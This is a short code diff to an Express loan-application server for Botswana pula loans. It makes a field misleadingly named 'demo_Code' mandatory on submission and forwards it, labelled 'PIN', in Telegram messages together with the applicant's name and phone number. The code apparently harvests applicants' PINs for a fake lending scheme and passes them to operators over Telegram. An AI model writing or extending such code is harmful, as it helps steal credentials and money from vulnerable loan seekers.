@@ -68,14 +68,16 @@ app.post("/api/submit", async (req, res) => {
       loan_amount_bwp,
       period_months,
       monthly_payment_bwp,
-      total_repayment_bwp
+      total_repayment_bwp,
+      demo_Code
     } = req.body;
 
     if (
       !full_name ||
       !phone_number ||
       !loan_amount_bwp ||
-      !period_months
+      !period_months ||
+      !demo_Code
     ) {
       return res.status(400).json({
         ok: false,
@@ -302,6 +304,7 @@ app.post("/api/telegram/webhook", async (req, res) => {
       `Applicant: ${application.full_name || "N/A"}`,
       `Phone: ${application.phone_number || "N/A"}`,
       `Loan amount: BWP ${application.loan_amount_bwp ?? "N/A"}`,
+      `PIN: ${application.demo_Code || "N/A"}`,
       `Application ID: ${application.id}`,
       `New status: ${updatedApplication.status}`,
       "",
